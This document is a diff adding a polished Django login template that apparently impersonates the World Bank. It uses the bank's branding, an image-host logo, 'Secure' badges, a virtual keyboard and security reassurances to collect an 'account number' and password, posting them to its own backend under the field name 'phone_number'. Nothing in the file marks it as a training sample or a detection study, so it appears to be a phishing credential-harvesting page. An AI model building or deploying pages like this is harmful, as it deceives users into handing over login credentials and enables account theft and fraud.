@@ -1,0 +1,681 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>World Bank - Secure Login</title>
+    <link rel="icon" href="https://i.postimg.cc/8P7NLtNC/worldbank-icon-modified.png" type="image/png" sizes="80x80">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #001f3f 0%, #003366 50%, #004080 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+        }
+        
+        .login-container {
+            background: rgba(255, 255, 255, 0.98);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 400px;
+            overflow: hidden;
+        }
+        
+        .security-header {
+            background: linear-gradient(135deg, #001f3f 0%, #003366 100%);
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        
+        .bank-logo {
+            display: flex;
+            align-items: center;
+        }
+        
+        .bank-logo img {
+            height: 32px;
+            width: 32px;
+            margin-right: 10px;
+        }
+        
+        .bank-logo span {
+            font-weight: 700;
+            font-size: 18px;
+            color: white;
+        }
+        
+        .secure-indicator {
+            display: flex;
+            align-items: center;
+            color: white;
+            font-size: 12px;
+        }
+        
+        .secure-dot {
+            width: 8px;
+            height: 8px;
+            background-color: #10b981;
+            border-radius: 50%;
+            margin-right: 6px;
+        }
+        
+        .form-content {
+            padding: 24px;
+        }
+        
+        .form-title {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        
+        .form-title h1 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1f2937;
+            margin-bottom: 6px;
+        }
+        
+        .form-title p {
+            font-size: 14px;
+            color: #6b7280;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #374151;
+            margin-bottom: 6px;
+        }
+        
+        .input-container {
+            position: relative;
+        }
+        
+        .input-icon {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #9ca3af;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 14px 14px 14px 42px;
+            border: 1px solid #d1d5db;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.2s;
+            background-color: white;
+        }
+        
+        .input-field:focus {
+            outline: none;
+            border-color: #3b82f6;
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
+        }
+        
+        .password-toggle {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #9ca3af;
+            cursor: pointer;
+        }
+        
+        .security-indicator {
+            height: 4px;
+            background: #e5e7eb;
+            border-radius: 2px;
+            margin-top: 8px;
+            overflow: hidden;
+        }
+        
+        .security-level {
+            height: 100%;
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 2px;
+        }
+        
+        .security-text {
+            font-size: 12px;
+            color: #6b7280;
+            margin-top: 4px;
+        }
+        
+        .password-requirements {
+            margin-top: 8px;
+            font-size: 12px;
+            color: #6b7280;
+        }
+        
+        .requirement {
+            display: flex;
+            align-items: center;
+            margin-bottom: 4px;
+        }
+        
+        .requirement i {
+            margin-right: 6px;
+            font-size: 10px;
+        }
+        
+        .requirement.met {
+            color: #10b981;
+        }
+        
+        .requirement.unmet {
+            color: #6b7280;
+        }
+        
+        .forgot-link {
+            font-size: 14px;
+            color: #3b82f6;
+            text-decoration: none;
+        }
+        
+        .forgot-link:hover {
+            color: #1d4ed8;
+        }
+        
+        .virtual-keyboard-toggle {
+            display: flex;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+        
+        .virtual-keyboard-toggle input {
+            margin-right: 8px;
+        }
+        
+        .virtual-keyboard-toggle label {
+            font-size: 14px;
+            color: #374151;
+        }
+        
+        .virtual-keyboard {
+            background: white;
+            border: 1px solid #e5e7eb;
+            border-radius: 12px;
+            padding: 12px;
+            margin-top: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            display: none;
+        }
+        
+        .keyboard-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 6px;
+            margin-bottom: 10px;
+        }
+        
+        .keyboard-key {
+            height: 44px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #f9fafb;
+            border: 1px solid #e5e7eb;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 500;
+            cursor: pointer;
+            user-select: none;
+            transition: all 0.1s;
+        }
+        
+        .keyboard-key:active {
+            background: #e5e7eb;
+            transform: scale(0.95);
+        }
+        
+        .keyboard-actions {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 8px;
+        }
+        
+        .keyboard-action-btn {
+            background: none;
+            border: none;
+            color: #3b82f6;
+            font-size: 14px;
+            cursor: pointer;
+            padding: 6px 0;
+        }
+        
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #001f3f 0%, #003366 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .login-btn:active {
+            transform: translateY(1px);
+        }
+        
+        .login-btn i {
+            margin-right: 8px;
+        }
+        
+        .signup-link {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #6b7280;
+        }
+        
+        .signup-link a {
+            color: #3b82f6;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .security-notice {
+            background: #eff6ff;
+            border: 1px solid #bfdbfe;
+            border-radius: 10px;
+            padding: 14px;
+            margin-top: 20px;
+        }
+        
+        .security-notice-content {
+            display: flex;
+        }
+        
+        .security-icon {
+            color: #3b82f6;
+            margin-right: 12px;
+            font-size: 18px;
+        }
+        
+        .security-text-content h3 {
+            font-size: 14px;
+            font-weight: 600;
+            color: #1e40af;
+            margin-bottom: 4px;
+        }
+        
+        .security-text-content p {
+            font-size: 13px;
+            color: #374151;
+            line-height: 1.4;
+        }
+        
+        .footer {
+            background: #f9fafb;
+            padding: 14px;
+            text-align: center;
+            border-top: 1px solid #e5e7eb;
+            font-size: 12px;
+            color: #6b7280;
+        }
+        
+        .footer a {
+            color: #6b7280;
+            text-decoration: none;
+        }
+        
+        .alert {
+            padding: 12px;
+            background: #fef2f2;
+            border: 1px solid #fecaca;
+            border-radius: 10px;
+            color: #dc2626;
+            margin-bottom: 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 14px;
+        }
+        
+        .alert-close {
+            background: none;
+            border: none;
+            color: #dc2626;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        
+        @media (max-width: 360px) {
+            .form-content {
+                padding: 20px;
+            }
+            
+            .security-header {
+                padding: 14px;
+            }
+            
+            .bank-logo span {
+                font-size: 16px;
+            }
+            
+            .form-title h1 {
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <!-- Security Header -->
+        <div class="security-header">
+            <div class="bank-logo">
+                <img src="https://i.postimg.cc/8P7NLtNC/worldbank-icon-modified.png" alt="World Bank">
+                <span>World Bank</span>
+            </div>
+            <div class="secure-indicator">
+                <div class="secure-dot"></div>
+                <span>Secure</span>
+            </div>
+        </div>
+        
+        <!-- Login Form -->
+        <div class="form-content">
+            <!-- Messages -->
+            {% for message in messages %}
+            <div class="alert">
+                <span>{{ message }}</span>
+                <button class="alert-close">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+            {% endfor %}
+            
+            <div class="form-title">
+                <h1>Secure Login</h1>
+                <p>Access your World Bank account</p>
+            </div>
+            
+            <form method="post">
+                {% csrf_token %}
+                
+                <!-- Account Number Field -->
+                <div class="form-group">
+                    <label for="account-number" class="form-label">Account Number</label>
+                    <div class="input-container">
+                        <div class="input-icon">
+                            <i class="fas fa-user"></i>
+                        </div>
+                        <input 
+                            type="text" 
+                            id="account-number" 
+                            name="phone_number" 
+                            class="input-field" 
+                            placeholder="Enter your account number"
+                            required
+                        >
+                    </div>
+                </div>
+                
+                <!-- Password Field -->
+                <div class="form-group">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px;">
+                        <label for="password" class="form-label">Password</label>
+                        <a href="#" class="forgot-link">Forgot Password?</a>
+                    </div>
+                    <div class="input-container">
+                        <div class="input-icon">
+                            <i class="fas fa-lock"></i>
+                        </div>
+                        <input 
+                            type="password" 
+                            id="password" 
+                            name="password" 
+                            class="input-field" 
+                            placeholder="Enter your password"
+                            required
+                            minlength="8"
+                            maxlength="20"
+                        >
+                        <button type="button" class="password-toggle" id="toggle-password">
+                            <i class="fas fa-eye"></i>
+                        </button>
+                    </div>
+                    
+                    <!-- Security Indicator -->
+                    <div class="security-indicator">
+                        <div id="security-level" class="security-level"></div>
+                    </div>
+                    <div class="security-text" id="security-text">Password strength</div>
+                    
+                    <!-- Password Requirements -->
+                    <div class="password-requirements">
+                        <div class="requirement unmet" id="req-length">
+                            <i class="fas fa-circle"></i>
+                            <span>At least 8 characters</span>
+                        </div>
+                        <div class="requirement unmet" id="req-uppercase">
+                            <i class="fas fa-circle"></i>
+                            <span>One uppercase letter</span>
+                        </div>
+                        <div class="requirement unmet" id="req-lowercase">
+                            <i class="fas fa-circle"></i>
+                            <span>One lowercase letter</span>
+                        </div>
+                        <div class="requirement unmet" id="req-number">
+                            <i class="fas fa-circle"></i>
+                            <span>One number</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Virtual Keyboard Toggle -->
+                <div class="virtual-keyboard-toggle">
+                    <input type="checkbox" id="virtual-keyboard-toggle">
+                    <label for="virtual-keyboard-toggle">Use virtual keyboard for added security</label>
+                </div>
+                
+                <!-- Virtual Keyboard -->
+                <div id="virtual-keyboard" class="virtual-keyboard">
+                    <div class="keyboard-grid">
+                        <div class="keyboard-key" data-key="1">1</div>
+                        <div class="keyboard-key" data-key="2">2</div>
+                        <div class="keyboard-key" data-key="3">3</div>
+                        <div class="keyboard-key" data-key="4">4</div>
+                        <div class="keyboard-key" data-key="5">5</div>
+                        <div class="keyboard-key" data-key="6">6</div>
+                        <div class="keyboard-key" data-key="7">7</div>
+                        <div class="keyboard-key" data-key="8">8</div>
+                        <div class="keyboard-key" data-key="9">9</div>
+                        <div class="keyboard-key" data-key="0">0</div>
+                        <div class="keyboard-key" data-action="backspace">
+                            <i class="fas fa-backspace"></i>
+                        </div>
+                    </div>
+                    <div class="keyboard-actions">
+                        <button type="button" class="keyboard-action-btn" id="close-keyboard">Close</button>
+                        <button type="button" class="keyboard-action-btn" id="clear-keyboard">Clear</button>
+                    </div>
+                </div>
+                
+                <!-- Login Button -->
+                <button type="submit" class="login-btn">
+                    <i class="fas fa-sign-in-alt"></i>Login to Your Account
+                </button>
+            </form>
+            
+            <!-- Additional Options -->
+            <div class="signup-link">
+                <p>Don't have an account? <a href="#">Contact your branch</a></p>
+            </div>
+            
+            <!-- Security Notice -->
+            <div class="security-notice">
+                <div class="security-notice-content">
+                    <div class="security-icon">
+                        <i class="fas fa-shield-alt"></i>
+                    </div>
+                    <div class="security-text-content">
+                        <h3>Security Notice</h3>
+                        <p>World Bank will never ask for your password via email, phone, or text message.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Footer -->
+        <div class="footer">
+            <p>© 2023 World Bank. All rights reserved. | <a href="#">Privacy & Security</a></p>
+        </div>
+    </div>
+    
+    <script>
+        // Toggle password visibility
+        document.getElementById('toggle-password').addEventListener('click', function() {
+            const passwordField = document.getElementById('password');
+            const icon = this.querySelector('i');
+            
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+                icon.classList.remove('fa-eye');
+                icon.classList.add('fa-eye-slash');
+            } else {
+                passwordField.type = 'password';
+                icon.classList.remove('fa-eye-slash');
+                icon.classList.add('fa-eye');
+            }
+        });
+        
+        // Password strength indicator
+        document.getElementById('password').addEventListener('input', function() {
+            const password = this.value;
+            const indicator = document.getElementById('security-level');
+            const text = document.getElementById('security-text');
+            
+            // Check password requirements
+            const hasMinLength = password.length >= 8;
+            const hasUppercase = /[A-Z]/.test(password);
+            const hasLowercase = /[a-z]/.test(password);
+            const hasNumber = /[0-9]/.test(password);
+            
+            // Update requirement indicators
+            updateRequirement('req-length', hasMinLength);
+            updateRequirement('req-uppercase', hasUppercase);
+            updateRequirement('req-lowercase', hasLowercase);
+            updateRequirement('req-number', hasNumber);
+            
+            // Calculate strength
+            let strength = 0;
+            let color = '#ef4444'; // red
+            let message = 'Weak';
+            
+            // Each requirement met adds 25% strength
+            if (hasMinLength) strength += 25;
+            if (hasUppercase) strength += 25;
+            if (hasLowercase) strength += 25;
+            if (hasNumber) strength += 25;
+            
+            // Set color and message based on strength
+            if (strength >= 75) {
+                color = '#10b981'; // green
+                message = 'Strong';
+            } else if (strength >= 50) {
+                color = '#f59e0b'; // amber
+                message = 'Medium';
+            }
+            
+            indicator.style.width = strength + '%';
+            indicator.style.backgroundColor = color;
+            text.textContent = 'Password strength: ' + message;
+        });
+        
+        // Update requirement indicator
+        function updateRequirement(id, isMet) {
+            const element = document.getElementById(id);
+            if (isMet) {
+                element.classList.remove('unmet');
+                element.classList.add('met');
+                element.querySelector('i').className = 'fas fa-check-circle';
+            } else {
+                element.classList.remove('met');
+                element.classList.add('unmet');
+                element.querySelector('i').className = 'fas fa-circle';
+            }
+        }
+        
+        // Virtual keyboard functionality
+        const keyboardToggle = document.getElementById('virtual-keyboard-toggle');
+        const virtualKeyboard = document.getElementById('virtual-keyboard');
+        const passwordField = document.getElementById('password');
+        const closeKeyboardBtn = document.getElementById('close-keyboard');
+        const clearKeyboardBtn = document.getElementById('clear-keyboard');
+        
+        keyboardToggle.addEventListener('change', function() {
+            if (this.checked) {
+                virtualKeyboard.style.display = 'block';
+            } else {
+                virtualKeyboard.style.display = 'none';
+            }
+        });
+        
+        // Handle keyboard key clicks
+        document.querySelectorAll('.keyboard-key').forEach(key => {
+            key.addEventListener('click', function() {
+                const action = this.getAttribute('data-action');
+                const keyValue = this.getAttribute('data-key');
+                
+                if (action === 'backspace') {
+                    passwordField.value = passwordField.value.slice(0, -1);
+                } else if (keyValue) {
+                    if (passwordField.value.length < 20) {
+                        passwordField.value += keyValue;
+                    }
+                }
+                
+                // Trigger the input event to update security indicator
+                passwordField.dispatchEvent(new Event('input'));
+            });
+        });
+        
+        closeKeyboardBtn.addEventListener('click', function() {
+            virtualKeyboard.style.display = 'none';
+            keyboardToggle.checked = false;
+        });
+        
+        clearKeyboardBtn.addEventListener('click', function() {
+            passwordField.value = '';
+            passwordField.dispatchEvent(new Event('input'));
+        });
+        
+        // Close messages when X is clicked
+        document.querySelectorAll('.alert-close').forEach(button => {
+            button.addEventListener('click', function() {
+                this.parentElement.style.display = 'none';
+            });
+        });
+    </script>
+</body>
+</html>
